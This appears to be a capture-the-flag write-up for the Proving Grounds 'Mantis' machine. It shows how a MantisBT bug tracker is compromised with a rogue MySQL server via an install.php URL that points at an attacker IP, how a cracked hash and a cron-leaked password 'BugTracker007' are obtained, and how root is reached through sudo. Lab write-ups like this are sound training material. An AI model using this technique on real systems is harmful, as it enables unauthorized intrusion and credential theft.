---
title: Mantis
date: 2025-04-24
categories:
- Proving Grounds
- Linux
tags:
- Proving Grounds
- Linux
---

# Mantis 🔸
<!-- more -->

## Enumeration

![](../assets/Pasted%20image%2020250424184602.png)

Web server shows a template of a landing page. `feroxbuster` discovers a `/bugtracker`.

![](../assets/Pasted%20image%2020250424190102.png)

Searching for an exploit, we find [https://mantisbt.org/bugs/view.php?id=23173](https://mantisbt.org/bugs/view.php?id=23173).

## Initial Access

We start the rogue server from [https://github.com/allyshka/Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server).

![](../assets/Pasted%20image%2020250424231043.png)

Visit `http://192.168.169.204/bugtracker/admin/install.php?install=3&hostname=192.168.45.206`

![](../assets/Pasted%20image%2020250424231110.png)

We can read **config_inc.php** file after seeing it in the mantis repo.

![](../assets/Pasted%20image%2020250424231509.png)

We have the database credentials.

![](../assets/Pasted%20image%2020250424231751.png)
![](../assets/Pasted%20image%2020250424231801.png)

`c7870d0b102cfb2f4916ff04e47b5c6f`

Using `hashcat`.

![](../assets/Pasted%20image%2020250424232138.png)

![](../assets/Pasted%20image%2020250424232201.png)

![](../assets/Pasted%20image%2020250424232243.png)

[https://mantisbt.org/bugs/view.php?id=26091](https://mantisbt.org/bugs/view.php?id=26091)

![](../assets/Pasted%20image%2020250424232546.png)

![](../assets/Pasted%20image%2020250424232853.png)

![](../assets/Pasted%20image%2020250424232940.png)

Get the flag.

![](../assets/Pasted%20image%2020250424233107.png)

## Privilege Escalation

We see a backup script but can't see it; there is a cron job.

![](../assets/Pasted%20image%2020250424233334.png)

Using `pspy64`.

![](../assets/Pasted%20image%2020250424235133.png)

We see the password `BugTracker007`.

![](../assets/Pasted%20image%2020250424235438.png)

`sudo -l` shows that `mantis` has full privileges, so...

![](../assets/Pasted%20image%2020250424235500.png)

## Post Exploitation

Get the flag.

![](../assets/Pasted%20image%2020250424235509.png)
